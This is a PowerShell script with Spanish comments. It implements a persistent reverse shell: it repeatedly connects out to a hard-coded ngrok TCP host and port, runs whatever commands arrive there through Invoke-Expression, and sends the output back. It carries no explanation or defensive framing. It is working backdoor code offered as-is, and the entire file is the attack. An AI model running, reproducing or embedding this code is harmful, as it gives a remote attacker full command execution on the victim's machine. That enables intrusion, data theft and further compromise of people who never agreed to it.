function ConvertFrom-ByteArray {
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Byte[]]$ByteArray,
        [Parameter(Position = 1)]
        [ValidateSet('ASCII', 'UTF8', 'UTF16', 'UTF32')]
        [String]$Encoding = 'UTF8'
    )

    if (!$ByteArray) {
        return ''
    }

    [Text.Encoding]::GetEncoding($($Encoding -replace 'UTF','UTF-')).GetString($ByteArray)
}

while ($true) {
    try {
        # Configuración de la dirección IP y puerto de ngrok
        $ipAddress = "7.tcp.eu.ngrok.io"
        $port = 10624

        # Creación del cliente TCP
        $client = New-Object System.Net.Sockets.TCPClient($ipAddress, $port)
        $stream = $client.GetStream()
        [byte[]]$buffer = 0..65535|%{0}

        # Bucle de lectura y escritura
        while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
            $command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i)
            try {
                # Ejecución del comando y captura de la salida
                $output = Invoke-Expression $command 2>&1 | Out-String
            } catch {
                $output = "Error en la ejecución del comando: $_"
            }
            $response = [System.Text.Encoding]::ASCII.GetBytes($output)
            $stream.Write($response, 0, $response.Length)
        }

        $client.Close()
    } catch {
        Write-Warning "Error en la conexión: $_"
        Start-Sleep -Seconds 5
    }
    Start-Sleep -Seconds 5
}


